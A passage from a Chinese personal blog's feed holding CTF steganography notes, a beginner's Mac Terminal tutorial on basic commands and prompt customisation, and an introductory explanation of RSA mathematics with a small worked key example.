alt="img"></p><p><strong>大功告成！</strong></p><h2 id="6-BUU·Misc·爱因斯坦"><a href="#6-BUU·Misc·爱因斯坦" class="headerlink" title="6. BUU·Misc·爱因斯坦"></a>6. BUU·Misc·爱因斯坦</h2><h3 id="·题解"><a href="#·题解" class="headerlink" title="·题解"></a>·题解</h3><blockquote><ul><li><p>打开后,看到爱因斯坦图片</p></li><li><p>strings 后看到有东西</p></li><li><p>binwalk -e 拆开</p></li><li><p>得到flag.txt、加密压缩包</p></li></ul></blockquote><h3 id="·困惑："><a href="#·困惑：" class="headerlink" title="·困惑："></a>·困惑：</h3><blockquote><p>以为是明文攻击，压缩后说文件太小，无法进行明文攻击。</p></blockquote><h3 id="·醍醐灌顶"><a href="#·醍醐灌顶" class="headerlink" title="·醍醐灌顶"></a>·醍醐灌顶</h3><blockquote><p><strong>属性 -&gt; 详细信息 -&gt; 备注</strong> 里有东西，可以拿来做压缩包密码的尝试，bingo！ </p></blockquote><h3 id="·总结"><a href="#·总结" class="headerlink" title="·总结"></a>·总结</h3><blockquote><p><strong>strings != 属性</strong></p></blockquote><h2 id="7-FLAG"><a href="#7-FLAG" class="headerlink" title="7. FLAG"></a>7. FLAG</h2><h3 id="·-题解"><a href="#·-题解" class="headerlink" title="· 题解"></a>· 题解</h3><blockquote><p>打开后binwalk -e，获得29.zilp,没思路了</p></blockquote><h3 id="·醍醐灌顶-1"><a href="#·醍醐灌顶-1" class="headerlink" title="·醍醐灌顶"></a>·醍醐灌顶</h3><blockquote><p>LSB藏了ZIP文件，bin下来后解压，以txt打开解压文件，搜索即可</p></blockquote><h3 id="·总结-1"><a href="#·总结-1" class="headerlink" title="·总结"></a>·总结</h3><blockquote><p><strong>zsteg的file显示要注重！！！</strong></p></blockquote><p><img src="http://m.qpic.cn/psc?/V11bsrVH039Qrc/45NBuzDIW489QBoVep5mcfzPysH2FTDoxyRhEsG1FDcqx3ZfxHEGuhuZDdSQ9tGd8*ur4V.Rre3xy7HXY57LPNJllJVy9y8UFutZE0OwzNQ!/b&bo=MAP6AAAAAAADJ8s!&rf=viewer_4" alt="img"></p><h2 id="8-D盾安装"><a href="#8-D盾安装" class="headerlink" title="8.D盾安装"></a>8.D盾安装</h2><h3 id="·-简介"><a href="#·-简介" class="headerlink" title="· 简介"></a>· 简介</h3><blockquote><p> 『D盾_防火墙』专为IIS设计的一个主动防御的保护软件,以内外保护的方式 防止网站和服务器给入侵。用于<strong>网页数据文件夹</strong></p></blockquote><h3 id="·-下载-1"><a href="#·-下载-1" class="headerlink" title="· 下载"></a>· 下载</h3><blockquote><p><a href="http://www.d99net.net">D盾下载</a></p></blockquote><p><img src="http://tva1.sinaimg.cn/large/007svEDHly1gkfh2i22ekj30n50g4q3i.jpg" alt="img"></p><h3 id="·注意事项"><a href="#·注意事项" class="headerlink" title="·注意事项"></a>·注意事项</h3><blockquote><p>虚拟机win需要把<strong>待扫描的文件夹</strong>放入<strong>c盘</strong>，总之<strong>不要在mac盘</strong></p></blockquote><h2 id="9-RouterPassView-安装"><a href="#9-RouterPassView-安装" class="headerlink" title="9. RouterPassView 安装"></a>9. RouterPassView 安装</h2><h3 id="·-简介-1"><a href="#·-简介-1" class="headerlink" title="· 简介"></a>· 简介</h3><blockquote><p>RouterPassView是一个找回路由器密码的工具，用于<strong>bin后缀文件</strong></p></blockquote><h3 id="·-下载-2"><a href="#·-下载-2" class="headerlink" title="· 下载"></a>· 下载</h3><blockquote><p><a href="https://www.onlinedown.net/soft/104401.htm">RouterPassView下载</a></p></blockquote><p><img src="https://src.onlinedown.net/d/file/p/2019-11-21/9d1a4a677a621f68a440a50bbf7365c1.jpg" alt="RouterPassView截图"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mac Terminal入门</title>
      <link href="/2021/12/09/Mac%20Terminal%E5%85%A5%E9%97%A8/"/>
      <url>/2021/12/09/Mac%20Terminal%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Mac-Terminal-basics-tutorial"><a href="#Mac-Terminal-basics-tutorial" class="headerlink" title="Mac Terminal basics tutorial"></a>Mac Terminal basics tutorial</h1><h2 id="·Code-form"><a href="#·Code-form" class="headerlink" title="·Code form"></a>·Code form</h2><p><img src="https://cdn.sspai.com/2018/07/11/e2b9dacea1df4a1045546ff298a08c50.png" alt="img"></p><hr><h2 id="·Basic-code"><a href="#·Basic-code" class="headerlink" title="·Basic code"></a>·Basic code</h2><ol><li><h3 id="echo-｜-Print"><a href="#echo-｜-Print" class="headerlink" title="echo ｜ Print"></a>echo ｜ Print</h3></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Hello, world!&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="2"><li><h3 id="About-file"><a href="#About-file" class="headerlink" title="About file"></a>About file</h3><p>· <strong>pwd | show current path</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">pwd</span></span><br></pre></td></tr></table></figure><p>· <strong>cd | change the path</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /Users/wenhui/Desktop</span><br></pre></td></tr></table></figure><p><img src="https://cdn.sspai.com/2018/07/05/8d0427a0705812a7d1e7611041f0e9b6.gif" alt="拖入快速提取路径"></p><p>!:  u can <strong>drug</strong> it into Terminal to get  the file path directly. </p><p>· <strong>ls</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -R </span><br><span class="line"><span class="comment"># List all subfolders</span></span><br></pre></td></tr></table></figure></li><li><h3 id="clear-｜-Clear-screen"><a href="#clear-｜-Clear-screen" class="headerlink" title="clear  ｜ Clear screen"></a>clear  ｜ Clear screen</h3></li><li><h3 id="sudo-Get-administrator-privileges"><a href="#sudo-Get-administrator-privileges" class="headerlink" title="sudo | Get administrator privileges"></a>sudo | Get administrator privileges</h3></li><li><h3 id="man-XXX-Learn-the-useage-of-XXX"><a href="#man-XXX-Learn-the-useage-of-XXX" class="headerlink" title="man XXX | Learn the useage of XXX"></a>man XXX | Learn the useage of XXX</h3><h3 id=""><a href="#" class="headerlink" title=""></a><img src="https://cdn.sspai.com/2018/07/05/0cf24c3eea3cda8441e4d4565cfc7dde.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1" alt="man"></h3><p>!: Press <strong>q</strong> to exit</p><h3 id="-1"><a href="#-1" class="headerlink" title=" "></a> </h3></li><li><h3 id="caffeinate-Keep-mac-work"><a href="#caffeinate-Keep-mac-work" class="headerlink" title="caffeinate | Keep mac work"></a>caffeinate | Keep mac work</h3><p><img src="https://cdn.sspai.com/2018/07/05/492e9c629f9a436bf5eb901dcff1faec.png" alt="img"></p><p>!: Press <strong>^Control -C</strong> to stop</p><span id="more"></span></li><li><h3 id="killall-XXX-Kill-XXX"><a href="#killall-XXX-Kill-XXX" class="headerlink" title="killall XXX | Kill XXX"></a>killall XXX | Kill XXX</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">killall WeChat </span><br></pre></td></tr></table></figure></li><li><h3 id="defaults"><a href="#defaults" class="headerlink" title="defaults"></a>defaults</h3><p>· Screencapture type</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">defaults write com.apple.screencapture <span class="built_in">type</span> jpg</span><br><span class="line"><span class="comment"># -&gt; JPEG</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">defaults write com.apple.screencapture <span class="built_in">type</span> png</span><br><span class="line"><span class="comment"># -&gt; PNG</span></span><br></pre></td></tr></table></figure><p>· show / Hide Folder</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">defaults write com.apple.finder AppleShowAllFiles -bool <span class="literal">true</span>; killall Finder</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">defaults write com.apple.finder AppleShowAllFiles -bool <span class="literal">false</span>; killall Finder</span><br></pre></td></tr></table></figure><p>!: <strong>ls -a</strong> also can be used to show hide folders</p><p>​     · Dock</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">defaults write com.apple.dock persistent-apps -array-add <span class="string">&#x27;&#123;&quot;tile-type&quot;=&quot;spacer-tile&quot;;&#125;&#x27;</span>; killall Dock</span><br><span class="line"><span class="comment"># Add a blank boundary symbol</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.sspai.com/2018/07/05/00a801ba4720b85c9723002cc81e3c39.jpg?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1" alt="为程序栏加分界符"></p><p>!; When u find there are too many symbols in Dock, u can <strong>delete</strong> it just by <strong>dragging</strong>.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">defaults delete com.apple.dock; killall Dock</span><br><span class="line"><span class="comment"># Restore Dock to factory settings</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.sspai.com/2018/07/05/00a801ba4720b85c9723002cc81e3c39.jpg" alt="img"></p></li></ol><ol start="4"><li><h3 id="amazing-echo"><a href="#amazing-echo" class="headerlink" title="amazing echo"></a>amazing echo</h3></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">banner -w 80 0HB</span><br></pre></td></tr></table></figure><p><img src="http://m.qpic.cn/psc?/V11bsrVH039Qrc/45NBuzDIW489QBoVep5mcX0BNK3pjcJhOngJrWUCYRnMOVF6TX5VQtOFZpfj4j7lrwiGG5km*zBr83hbBQqmiRKC4Dt3NeJPCMS0Wihvlrg!/b&bo=OAQLBQAAAAADV0A!&rf=viewer_4" alt="ae"></p><h2 id="改名"><a href="#改名" class="headerlink" title="改名"></a>改名</h2><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220812195658654.png" alt="改名前"></p><p>因为时常需要写些wp等东西，再加上后面果子默认的主机名实在太长了</p><p>对着市面上老旧的教程，研究了好一会，发现都不全面完善，现总结、补充如下</p><p>本机配置：</p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220812195610919.png" alt="配置"></p><ol><li><p>修改@后的主机名</p><ul><li><p><a href="https://jingyan.baidu.com/article/6b1823090e721afa58e15998.html">https://jingyan.baidu.com/article/6b1823090e721afa58e15998.html</a></p><p>通过修改共享里的配置，达到目的</p></li><li><p><a href="https://blog.csdn.net/liuchuo/article/details/79967956">https://blog.csdn.net/liuchuo/article/details/79967956</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo scutil —<span class="built_in">set</span> ComputerName Caliburn</span><br></pre></td></tr></table></figure><p>通过scutil指令修改</p></li></ul></li><li><p>修改@前的用户名</p><p>这颇为费劲，要了命了</p><ul><li><p>尝试了<code>sudo scutil —set HostName  0HB</code>,<strong>没效果</strong></p></li><li><p><a href="https://blog.csdn.net/weixin_28878287/article/details/118269694">https://blog.csdn.net/weixin_28878287/article/details/118269694</a></p><p>尝试了改了管理员的用户名，<strong>无果</strong></p></li><li><p><a href="https://www.zhihu.com/question/63137511/answer/1347552071">https://www.zhihu.com/question/63137511/answer/1347552071</a></p><p>直接动手修改/etc/bashrc的配置，也没效果</p><p>要放弃了，etc文件下逛了下，看到了zshrc</p><p>突然记起来，mac os终端改成zsh了🥲</p><p>于是,有如下操作</p><ul><li><p><code>sudo su</code> root权限才能改配置文件</p></li><li><p><code>vim /private/etc/zshrc</code>  修改文件内容</p><ul><li><p>按<code>i</code>开始编辑</p></li><li><p>修改文件里以下内容</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Default prompt</span></span><br><span class="line"><span class="attr">PS1</span>=<span class="string">&quot;0HB@%m %1~ %# &quot;</span></span><br></pre></td></tr></table></figure></li><li><p>按<code>ESC</code>,再<code>:</code>输入<code>wq!</code>，即：保存修改退出</p></li></ul></li><li><p><strong>重启终端</strong> 或 <code>source /private/etc/zshrc</code></p><p>后者不需要重启终端，执行即可，但可能会出现<code>0HB@%m %1~ %</code>的情况，重启终端后正常显示<code>0HB@Caliburn ~ %</code></p></li></ul></li></ul></li><li><p>修改路径</p><p>本该告一段落，但尝试修改终端@前的用户名时，无意间找到了修改路径里/User后用户名的方法</p><p>又想着想来写wp时，为了隐私，需要改路径名，太有用了，特此记录</p><ul><li><p><a href="https://blog.csdn.net/sinat_35811978/article/details/96569707">https://blog.csdn.net/sinat_35811978/article/details/96569707</a></p><p>文章写的很清楚，大体思路为以下几点</p><ul><li>创建另一个admin用户</li><li>利用这个admin用户，改了原文件夹名</li><li>改原用户名与改的文件夹名一致</li><li>修改对于文件夹路径</li></ul></li></ul><p>效果: <code>/Users/0HB/Desktop/星盟招新</code></p><p><strong>缺点：终端里的配置可能会丢失，比如conda、python</strong>、<strong>clear失效</strong></p><ul><li><p>clear报错</p><p><a href="https://blog.csdn.net/qq_29695701/article/details/90715653">https://blog.csdn.net/qq_29695701/article/details/90715653</a></p></li><li><p>conda、sage</p><p>改路径，改不完！</p><p>直接删了重下，发现各种报错，利用<a href="https://doc.sagemath.org/html/en/installation/conda.html#sec-installation-conda-develop">官网介绍的mamba</a>教程在<a href="https://github.com/conda-forge/miniforge#mambaforge">仓库</a>利用sh文件下载sage</p><p>打开方式不变</p></li></ul></li></ol><p>最后来一张终端效果图，Caliburn-石中剑。</p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220812195455627.png" alt="改名后"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Mac OS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Crypto·RSA算法入门之原理学习</title>
      <link href="/2021/12/08/Crypto%C2%B7RSA%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0/"/>
      <url>/2021/12/08/Crypto%C2%B7RSA%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="RSA-复习—阮一峰日志学习笔记"><a href="#RSA-复习—阮一峰日志学习笔记" class="headerlink" title="RSA 复习—阮一峰日志学习笔记"></a>RSA 复习—阮一峰日志学习笔记</h1><h2 id="1-RSA算法产生的背景"><a href="#1-RSA算法产生的背景" class="headerlink" title="1. RSA算法产生的背景:"></a>1. RSA算法产生的背景:</h2><p>1976年以前，所有的加密方法都是同一种模式：</p><h3 id="对称加密算法"><a href="#对称加密算法" class="headerlink" title="对称加密算法"></a><a href="https://zh.wikipedia.org/zh-cn/对等加密">对称加密算法</a></h3><blockquote><p>（1）甲方选择某一种加密规则，对信息进行加密；<br>（2）乙方使用同一种规则，对信息进行解密。</p></blockquote><h4 id="弱点："><a href="#弱点：" class="headerlink" title="弱点："></a>弱点：</h4><blockquote><p>甲方必须把加密规则告诉乙方，否则无法解密。<br><strong>传递密钥</strong>的<strong>安全性无法保证</strong>，一旦传递过程中，加密规则被截获就失去了加密的意义。</p></blockquote><p>这时，新的加密方法便应运而生：</p><h3 id="非对称加密算法"><a href="#非对称加密算法" class="headerlink" title="非对称加密算法"></a>非对称加密算法</h3><blockquote><p>（1）乙方生成两把密钥（<strong>公钥</strong>和<strong>私钥</strong>）。<br><strong>公钥</strong>是<strong>公开</strong>的，任何人都可以获得，<strong>私钥</strong>则是<strong>保密</strong>的。<br>（2）甲方获取乙方的公钥，然后用它对信息加密。<br>（3）乙方得到加密后的信息，用私钥解密。</p></blockquote><p>此时，乙方只要公布他的公钥，甲方就可以通过公钥对发送的信息进行加密然后将密文给到乙方。奇妙的地方在于，以世界目前算力，只有乙方用手上的私钥才能解密获得明文，而<strong>解密的钥匙没有经过传递</strong>，安全性得到了保障。</p><p><strong>RSA算法属于非对称密码</strong>。</p><hr><hr><h2 id="2-数学知识储备"><a href="#2-数学知识储备" class="headerlink" title="2. 数学知识储备"></a>2. 数学知识储备</h2><h3 id="·互质关系"><a href="#·互质关系" class="headerlink" title="·互质关系"></a>·<a href="https://zh.wikipedia.org/zh-cn/互質">互质关系</a></h3><blockquote><p>如果两个正整数，<strong>除了1</strong>以外，<strong>没有其他公因子</strong>，我们就称这两个数是互质关系（coprime）。<br>比如，15和32没有公因子，所以它们是互质关系。这说明，不是质数也可以构成互质关系。</p></blockquote><h4 id="互质结论"><a href="#互质结论" class="headerlink" title="互质结论:"></a>互质结论:</h4><blockquote><ol><li>任意两个质数构成互质关系，比如13和61。</li><li>一个数是质数，另一个数只要不是前者的倍数，两者就构成互质关系，比如3和10。</li><li>如果两个数之中，较大的那个数是质数，则两者构成互质关系，比如97和57。</li><li>1和任意一个自然数是都是互质关系，比如1和99。</li><li>p是大于1的整数，则p和p-1构成互质关系，比如57和56。</li><li>p是大于1的奇数，则p和p-2构成互质关系，比如17和15。</li></ol></blockquote><hr><p>以上<em>看过一遍，理解就好，<strong>不需要刻意记忆</strong>。</em></p><p>以下<em>要求<strong>理解记忆</strong>，越熟练越好！</em></p><hr><h3 id="·欧拉函数"><a href="#·欧拉函数" class="headerlink" title="·欧拉函数"></a>·欧拉函数</h3><h4 id="引入："><a href="#引入：" class="headerlink" title="引入："></a>引入：</h4><blockquote><p>　　　　任意给定正整数n，请问在小于等于n的正整数之中，有多少个与n构成互质关系？（比如，在1到8之中，有多少个数与8构成互质关系？）</p></blockquote><p>计算这个值的方法就叫做<a href="https://zh.wikipedia.org/wiki/欧拉函数">欧拉函数</a>，以φ(n)表示。在1到8之中，与8形成互质关系的是1、3、5、7，所以 φ(n) = 4.</p><p><em>φ(n) 计算公式需要一步步讨论。</em></p><h4 id="讨论："><a href="#讨论：" class="headerlink" title="讨论："></a>讨论：</h4><ol><li><p><em>如果n=1，则 φ(1) = 1 。因为1与任何数（包括自身）都构成互质关系。</em></p></li><li><p><em>如果n是质数，则 φ(n)=n-1 。因为质数与小于它的每一个数，都构成互质关系。比如5与1、2、3、4都构成互质关系。</em></p></li><li><p><em>如果n是质数的某一个次方，即 n = pk (p为质数，k为大于等于1的整数)，则:</em></p><p><img src="https://latex.codecogs.com/gif.latex?%5Cbg_white%20%5Cphi%28p%5E%7Bk%7D%29%3Dp%5E%7Bk%7D-p%5E%7Bk-1%7D" alt="qwe"></p></li></ol><blockquote><p><em>比如 φ(8) = φ(23) =23 - 22 = 8 -4 = 4。</em></p><p><em>这是因为只有当一个数不包含质数p，才可能与n互质。而包含质数p的数一共有pk-1个，即1×p、2×p、3×p、…、pk-1×p，把它们去除，剩下的就是与n互质的数。</em></p><p><em>上面的式子还可以写成下面的形式：</em></p><p><img src="https://latex.codecogs.com/gif.latex?%5Cbg_white%20%5Cphi%28p%5E%7Bk%7D%29%3Dp%5E%7Bk%7D-p%5E%7Bk-1%7D%3Dp%5E%7Bk%7D%281-%5Cfrac%7B1%7D%7Bp%7D%29" alt="gs2"></p><p><em>可以看出，上面的第2种情况是 k=1 时的特例。</em></p></blockquote><ol><li><p><em>如果n可以分解成两个互质的整数之积</em>，<strong>n = p1 × p2</strong>，<em>则</em>：</p><p><strong>φ(n) = φ(p1p2) = φ(p1)φ(p2)</strong></p></li></ol><blockquote><p>即积的欧拉函数等于各个因子的欧拉函数之积。比如，φ(56)=φ(8×7)=φ(8)×φ(7)=4×6=24。</p><p>这一条的证明要用到<a href="https://en.wikipedia.org/wiki/Chinese_remainder_theorem">“中国剩余定理”</a>，这里就不展开了</p></blockquote><ol><li><p><em>因为任意一个大于1的正整数，都可以写成一系列质数的积。</em></p><p><img src="http://m.qpic.cn/psc?/V11bsrVH039Qrc/45NBuzDIW489QBoVep5mcYfw*AMG5vKwgtJQ2X3Pm*PUmaApuae8k9nBEz3hNDdZe.74sRH7dY0RnQsCLf*oRkyD5O0faWB2DtjtGtKoH.Q!/b&bo=0wAoAAAAAAADF8k!&rf=viewer_4" alt="img"></p></li></ol><blockquote><p><em>根据第4条的结论，得到</em>:</p><p><img src="http://m.qpic.cn/psc?/V11bsrVH039Qrc/45NBuzDIW489QBoVep5mcUrRQo*.8wP1Z3cw8so21Vt3k.JBMlJ5a0WM1VT.FVx5NhCX3W9hg8O0t9Tmq7lRElhd4ZoC6qQTv6v*9BrOlVE!/b&bo=cwEoAAAAAAADF2g!&rf=viewer_4" alt="img"></p><p><em>再根据第3条的结论，得到:</em></p><p><img src="http://m.qpic.cn/psc?/V11bsrVH039Qrc/45NBuzDIW489QBoVep5mceR7hTaMu3uxIf*pzdRWUNGPk.hVsDnxxV6UPBntFg59KrmvXkKLql82UyaHByYRCKPq5GYT*TXzq3zPY2ADlvA!/b&bo=NQI8AAAAAAADFzk!&rf=viewer_4" alt="img"></p></blockquote><p><em>也就等于</em><br><img src="http://m.qpic.cn/psc?/V11bsrVH039Qrc/45NBuzDIW489QBoVep5mceR7hTaMu3uxIf*pzdRWUNHzQYPyxfy1h8009CpdMVxqJzvOML*SQCX3EoF0PaLUmaxA1k5iOanIioe0v3inRqw!/b&bo=sgE8AAAAAAADF70!&rf=viewer_4" alt="img"></p><p><em>这就是**</em>欧拉函数的通用计算公式**</p><blockquote><p>比如，1323的欧拉函数，计算过程如下：</p><p><img src="http://m.qpic.cn/psc?/V11bsrVH039Qrc/45NBuzDIW489QBoVep5mceR7hTaMu3uxIf*pzdRWUNEDBWQUQi6tV18.XY*D3F7jYwye6qEt5uul56Yym0hCoRn0ta5W5ojlWMMLvXGNApg!/b&bo=hwI8AAAAAAADF4s!&rf=viewer_4" alt="img"></p></blockquote><hr><h3 id="·欧拉定理"><a href="#·欧拉定理" class="headerlink" title="·欧拉定理"></a>·欧拉定理</h3><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><p><strong>如果两个正整数a和n互质，则n的欧拉函数 φ(n) 可以让下面的等式成立：</strong></p><p><img src="http://m.qpic.cn/psc?/V11bsrVH039Qrc/45NBuzDIW489QBoVep5mcVfwBprH1UhtYUERICYZnDD0xqDsqNohTlqll73gt2X.IufR2h9rLDIKBuW4N9GhqJ91iJ8R1WkY3gsLvrVUNFk!/b&bo=UAE8AAAAAAADF18!&rf=viewer_4" alt="img"></p><h4 id="注：补充知识—同余"><a href="#注：补充知识—同余" class="headerlink" title="注：补充知识—同余"></a>注：补充知识—<a href="https://baike.baidu.com/item/同余式/6024642?fr=aladdin">同余</a></h4><blockquote><p>同余可理解为，a的phi(n)次方除n的余数 = 1除n的余数（就是1）</p></blockquote><p><em>也就是说，a的φ(n)次方被n除的余数为1。或者说，a的φ(n)次方减去1，可以被n整除。比如，3和7互质，而7的欧拉函数φ(7)等于6，所以3的6次方（729）减去1，可以被7整除（728/7=104）。</em></p><h4 id="欧拉定理特殊情况"><a href="#欧拉定理特殊情况" class="headerlink" title="欧拉定理特殊情况"></a>欧拉定理特殊情况</h4><p><strong>假设正整数a与质数p互质，因为质数p的φ(p)等于p-1，则欧拉定理可以写成</strong></p><p><img src="http://m.qpic.cn/psc?/V11bsrVH039Qrc/45NBuzDIW489QBoVep5mcdyCb3JzIOWog8CzpCt9v4J0*Jd5YW5T*rg0eeMrbvqoLuE0ZW*6P4fGI3CQfqUS2NBiuyAcJsPR*g8j3zN*6PQ!/b&bo=*wAoAAAAAAADF.U!&rf=viewer_4" alt="img"></p><p>这就是著名的<a href="https://zh.wikipedia.org/wiki/费马小定理"><strong>费马小定理</strong></a>。它是欧拉定理的特例。</p><hr><h3 id="·模反元素"><a href="#·模反元素" class="headerlink" title="·模反元素"></a>·模反元素</h3><h4 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h4><p><strong>如果两个正整数a和n互质，那么一定可以找到整数b，使得 ab-1 被n整除，或者说ab被n除的余数是1。</strong></p><p><img src="http://m.qpic.cn/psc?/V11bsrVH039Qrc/45NBuzDIW489QBoVep5mcdyCb3JzIOWog8CzpCt9v4LhM5r6MhCVnNt9Mk2GxH5xG08N6FMtAA*w7JUBrzOTCjCN13nvwKSgTGQvPDXyros!/b&bo=7AAoAAAAAAADF*Y!&rf=viewer_4" alt="img"></p><p><strong>这时，b就叫做a的<a href="https://zh.wikipedia.org/wiki/模反元素">“模反元素”</a>。</strong></p><blockquote><p>比如，3和11互质，那么3的模反元素就是4，因为 (3 × 4)-1 可以被11整除。显然，模反元素不止一个， 4加减11的整数倍都是3的模反元素 {…,-18,-7,4,15,26,…}，即如果b是a的模反元素，则 b+kn 都是a的模反元素。</p></blockquote><hr><hr><h2 id="3-RSA加解密"><a href="#3-RSA加解密" class="headerlink" title="3. RSA加解密"></a>3. RSA加解密</h2><h3 id="·密钥生成的步骤"><a href="#·密钥生成的步骤" class="headerlink" title="·密钥生成的步骤"></a><strong>·密钥生成的步骤</strong></h3><blockquote><p><strong>第一步，随机选择两个不相等的质数p和q。</strong><br>·比如乙方选择了61和53。</p><p><strong>第二步，计算p和q的乘积n。</strong><br>·n = 61×53 = 3233</p><p><strong>第三步，计算n的欧拉函数φ(n)。</strong><br>·φ(n) = (p-1)(q-1)<br>​·φ(3233) = 60×52 = 3120</p><p><strong>第四步，随机选择一个整数e，条件是1&lt; e &lt; φ(n)，且e与φ(n) 互质。</strong><br>·乙方从1到3120选择了 17（实际应用中，<strong>常选65537</strong>）</p><p><strong>第五步，计算e对于φ(n)的模反元素d。</strong><br>·所谓<a href="https://zh.wikipedia.org/wiki/模反元素">“模反元素”</a>就是指有一个整数d，可以使得ed被φ(n)除的余数为1<br>​·ed ≡ 1 (mod φ(n)) 等价于 ed - 1 = kφ(n) 等价于 ex + φ(n)y = 1 等价于 17x + 3120y = 1<br>​·用<a href="https://zh.wikipedia.org/wiki/扩展欧几里得算法">“扩展欧几里得算法”</a>求解*（具体代码看<a href="http://ctf.nefu.edu.cn/bbs/d/78-rsa-writeup">RSA WriteUP</a>），得：(x,y)=(2753,-15)，即 d=2753。</p><p><strong>第六步，n和e为公钥，n和d为私钥。</strong><br>· 知道n,e为公钥（公布出去）,n和d为私钥（自己藏着）。</p></blockquote><h3 id="·加密和解密"><a href="#·加密和解密" class="headerlink" title="·加密和解密"></a><strong>·加密和解密</strong></h3><blockquote><p><strong>（1）加密要用公钥 (n,e)</strong></p><p> ·甲方拿到n,e 。要将明文65加密成密文（<strong>m为明文，c为密文</strong>）</p><p> ·利用公式（<strong>mod（n）是除于n取余数的意思</strong>）</p><p> <img src="https://latex.codecogs.com/gif.latex?%5Cbg_white%20c%20%3D%20m%5E%7Be%7Dmod%28n%29" alt="This is the rendered form of the equation. You can not edit this directly. Right click will give you the option to save the image, and in most browsers you can drag the image onto your desktop or another program."></p><p> ·得：c = 2790</p><p><strong>（2）解密要用私钥(n,d)</strong></p><p> ·乙方收到密文m，自己手里有公钥，当然也有密钥n，d</p><p> ·利用公式</p><p> <img src="https://latex.codecogs.com/gif.latex?%5Cbg_white%20m%20%3D%20c%5E%7Bd%7D%20mod%28n%29" alt="This "></p><p> ·得：m = 65 ，则<strong>RSA算法加解密原理到此结束</strong></p></blockquote><hr><hr><h3 id="4-CTF中RSA算法题"><a href="#4-CTF中RSA算法题" class="headerlink" title="4. CTF中RSA算法题"></a>4. CTF中RSA算法题</h3><h3 id="·需要安装的第三方库"><a href="#·需要安装的第三方库" class="headerlink" title="·需要安装的第三方库"></a><strong>·需要安装的第三方库</strong></h3><ul><li><p>解题一般用python，这里需要安装两个库<strong>pycryptodome</strong>、<strong>gmpy2</strong></p></li><li><p>在pycharm的下方Terminal中分别输入：</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install pycryptodome</span><br><span class="line">pip install gmpy2</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Crypto·Py3编码</title>
      <link href="/2021/12/08/Crypto%C2%B7Py3%E7%BC%96%E7%A0%81/"/>
      <url>/2021/12/08/Crypto%C2%B7Py3%E7%BC%96%E7%A0%81/</url>
      
